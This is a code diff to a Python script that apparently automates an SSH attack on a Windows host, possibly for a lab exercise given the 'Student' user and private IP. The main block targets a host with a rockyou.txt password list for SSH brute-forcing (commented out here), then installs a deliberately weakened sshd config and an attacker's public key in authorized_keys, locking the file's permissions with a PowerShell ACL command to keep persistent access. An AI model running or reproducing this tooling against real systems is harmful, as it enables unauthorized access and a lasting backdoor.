@@ -114,7 +114,7 @@ def setup_ssh_config_and_key(hostname, port, credentials_path="resources\\creden
         scp.close()
 
         # Set access rule protection and permissions on authorized_keys file using pwsh.exe
-        acl_cmd = f'pwsh.exe -Command "$acl = Get-Acl \'C:\\Users\\{username}\\.ssh\\EmptyFile.txt\'; $acl.SetAccessRuleProtection($true, $false); $administratorsRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'Administrators\',\'FullControl\',\'Allow\'); $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'SYSTEM\',\'FullControl\',\'Allow\'); $acl.SetAccessRule($administratorsRule); $acl.SetAccessRule($systemRule); $acl | Set-Acl"'
+        acl_cmd = f'pwsh.exe -Command "$acl = Get-Acl \'C:\\Users\\{username}\\.ssh\\authorized_keys\'; $acl.SetAccessRuleProtection($true, $false); $administratorsRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'Administrators\',\'FullControl\',\'Allow\'); $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'SYSTEM\',\'FullControl\',\'Allow\'); $acl.SetAccessRule($administratorsRule); $acl.SetAccessRule($systemRule); $acl | Set-Acl"'
 
         ssh.exec_command(acl_cmd)
 
@@ -197,17 +197,18 @@ def ssh_run_command_privKey(command, host, username, password=None, private_key_
     ssh.close()
 
 if __name__ == "__main__":
-    hostname = "100.87.185.10"
+    hostname = "172.16.2.77"
     port = 22
-    username = "itpuser"
+    username = "Student"
     password_file = "resources\\rockyou.txt"
 
-    ssh_brute_force(hostname, port, username, password_file)
+    #ssh_brute_force(hostname, port, username, password_file)
 
+    credentials_path = "resources\\credentials.csv"
     sshd_config_path = "resources\\vuln_sshd_config"
     access_key_path = "resources\\accessKey.pub"
 
-    setup_ssh_config_and_key(hostname, sshd_config_path, access_key_path)
+    setup_ssh_config_and_key(hostname, port, credentials_path, sshd_config_path, access_key_path)
 
     private_key_path = "resources\\accessKey"
 
